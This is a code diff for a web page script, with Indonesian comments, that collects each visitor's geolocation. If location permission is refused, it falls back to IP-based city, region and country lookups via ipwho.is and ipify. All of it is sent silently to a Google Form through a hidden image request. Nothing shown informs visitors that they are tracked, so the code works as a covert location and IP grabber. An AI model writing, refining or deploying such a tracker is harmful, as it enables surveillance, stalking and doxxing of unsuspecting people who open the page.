@@ -9,19 +9,21 @@
   <script>
     const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdmCzOfz6cYaPXncwwhYKyeRX_ZUP6YhMmMWYKSSkGreLrURQ/formResponse';
     const F = {
-      lat:  'entry.336954328',   // Latitude
-      long: 'entry.122334606',   // Longitude
-      acc:  'entry.1466949585',  // Accuracy
-      city: 'entry.1958665783',  // City
-      reg:  'entry.1713030934',  // Region
-      id:   'entry.2142024660',  // Country/ID
-      ip:   'entry.1095561107'   // IP
+      lat:  'entry.336954328',
+      long: 'entry.122334606',
+      acc:  'entry.1466949585',
+      city: 'entry.1958665783',
+      reg:  'entry.1713030934',
+      id:   'entry.2142024660',
+      ip:   'entry.1095561107'
     };
 
+    // Kirim ke Form
     function submit(params) {
       new Image().src = FORM_URL + '?' + new URLSearchParams(params);
     }
 
+    // Wrapper untuk kirim semua field
     function sendAll(lat, lon, acc, city, reg, country, ip) {
       const p = {
         [F.lat]:  lat,
@@ -29,47 +31,56 @@
         [F.acc]:  acc,
         [F.ip]:   ip
       };
-      if (city     !== undefined) p[F.city] = city;
-      if (reg      !== undefined) p[F.reg]  = reg;
-      if (country  !== undefined) p[F.id]   = country;
+      if (city    !== undefined) p[F.city] = city;
+      if (reg     !== undefined) p[F.reg]  = reg;
+      if (country !== undefined) p[F.id]   = country;
       submit(p);
     }
 
-    function onGeoSuccess(pos) {
-      const { latitude, longitude, accuracy } = pos.coords;
-      // ambil IP via api.ipify.org (CORS OK)
+    // Dipanggil kalau geolocation OK
+    function onGeoSuccess(position) {
+      const { latitude, longitude, accuracy } = position.coords;
+      // Ambil IP via ipify (CORS OK)
       fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
-        .then(d => sendAll(
-          latitude, longitude, accuracy,
-          undefined, undefined, undefined,
-          d.ip
-        ))
-        .catch(() => sendAll(
-          latitude, longitude, accuracy,
-          undefined, undefined, undefined,
-          'unknown'
-        ));
-    }
-
-    function onGeoError() {
-      // fallback: ipwho.is untuk IP + lokasi aproksimasi
-      fetch('https://ipwho.is/json/')
-        .then(r => r.json())
-        .then(d => sendAll(
-          d.latitude, d.longitude, 'IP',
-          d.city, d.region, d.country,
-          d.ip
-        ))
+        .then(d => {
+          sendAll(latitude, longitude, accuracy, undefined, undefined, undefined, d.ip);
+        })
         .catch(() => {
-          // jika semua gagal, kirim minimal IP
-          fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(d => submit({ [F.ip]: d.ip }))
-            .catch(() => submit({ [F.ip]: 'unknown' }));
+          sendAll(latitude, longitude, accuracy, undefined, undefined, undefined, 'unknown');
         });
     }
 
+    // Dipanggil kalau geolocation ditolak / gagal
+    function onGeoError() {
+      // Fallback ambil IP+geo aproksimasi via ipwho.is (CORS OK)
+      fetch('https://ipwho.is/json/')
+        .then(r => r.json())
+        .then(d => {
+          sendAll(
+            d.latitude,
+            d.longitude,
+            'IP',
+            d.city,
+            d.region,
+            d.country,
+            d.ip
+          );
+        })
+        .catch(() => {
+          // Jika ipwho.is juga gagal, fallback ambil IP saja
+          fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => {
+              sendAll(0, 0, 'error', undefined, undefined, undefined, d.ip);
+            })
+            .catch(() => {
+              sendAll(0, 0, 'error', undefined, undefined, undefined, 'unknown');
+            });
+        });
+    }
+
+    // Mulai tracking
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         onGeoSuccess,
